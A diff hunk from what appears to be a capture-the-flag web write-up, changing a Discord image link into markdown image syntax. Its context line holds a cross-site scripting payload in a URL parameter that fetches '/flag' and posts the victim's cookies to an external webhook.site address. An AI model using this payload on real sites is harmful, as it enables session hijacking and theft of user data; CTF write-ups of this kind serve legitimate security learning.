@@ -36,4 +36,4 @@ And then we are logged in as Jamie, and we figure out that we need to contact th
 
 http://141.85.224.118:7081/?nickname=<script>fetch('/flag').then(r=>r.text()).then(d=>fetch('https://webhook.site/6a985bb3-a95b-439f-9de3-791071bb4aea',{method:'POST',body:document.cookie}))</script>
 
-[https://media.discordapp.net/attachments/1392091689140752385/1393635384272879666/image.png?ex=68753518&is=6873e398&hm=3b9c4848bb9ad681405d854c2e43df80c7798159c2b897a60ce1e0ef11072397&=&format=webp&quality=lossless]
+![img](https://media.discordapp.net/attachments/1392091689140752385/1393635384272879666/image.png?ex=68753518&is=6873e398&hm=3b9c4848bb9ad681405d854c2e43df80c7798159c2b897a60ce1e0ef11072397&=&format=webp&quality=lossless)
